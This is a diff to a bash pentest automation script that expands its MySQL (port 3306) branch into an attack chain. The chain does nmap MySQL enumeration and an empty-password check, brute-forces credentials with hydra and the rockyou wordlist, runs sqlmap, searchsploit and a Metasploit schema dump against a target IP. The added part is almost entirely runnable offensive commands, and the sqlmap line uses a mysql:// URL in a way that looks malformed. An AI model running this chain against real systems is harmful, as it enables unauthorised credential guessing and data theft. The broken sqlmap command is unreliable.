@@ -2,6 +2,7 @@
 
 # Define the Nmap results file
 RESULTS_FILE="scan_results.txt"
+OUTPUT_FILE="final_results.txt"
 
 #Colour codes                                                # Sorry, Colour blinds!!!
 RED='\033[0;31m'    #Severe
@@ -45,8 +46,25 @@ for port in $OPEN_PORTS; do
 	    nmap -sV --script=http-enum $TARGET_IP;;
         
         3306)  
-            echo "MySQL detected - Checking for anonymous access..."
-            ;;
+            echo "[+] Scanning MySQL on $TARGET_IP..."
+	    nmap -p 3306 --open -sV --script=mysql* "$TARGET_IP"
+	    echo "[+] Checking for Anonymous Login..."
+	    nmap --script=mysql-empty-password -p 3306 "$TARGET_IP"
+	    echo "[+] Attempting Brute Force with Hydra..."
+	    hydra -L /usr/share/metasploit-framework/data/wordlists/unix_users.txt -P /usr/share/wordlists/rockyou.txt "$TARGET_IP" mysql -V 
+	    echo "[+] Checking for MySQL Database Enumeration..."
+	    nmap --script=mysql-databases -p 3306 "$TARGET_IP"
+	    echo "[+] Checking for MySQL Users Enumeration..."
+	    nmap --script=mysql-users -p 3306 "$TARGET_IP"
+	    echo "[+] Checking for MySQL Weak Authentication..."
+	    nmap --script=mysql-brute -p 3306 "$TARGET_IP"
+	    echo "[+] Running SQL Injection Test with sqlmap..."
+	    sqlmap -u "mysql://root@${TARGET_IP}/" --batch --dbs
+	    echo "[+] Checking for MySQL Version Vulnerabilities..."
+	    searchsploit mysql
+	    echo "[+] Checking for Exploitable MySQL Misconfigurations with Metasploit..."
+	    msfconsole -q -x "use auxiliary/scanner/mysql/mysql_schemadump; set RHOSTS $TARGET_IP; run; exit"
+	    ;;
         
     139|445)
 	    printf "\n\n${YELLOW}[+] SMB service is open and enumerating the shares...${NC}\n"
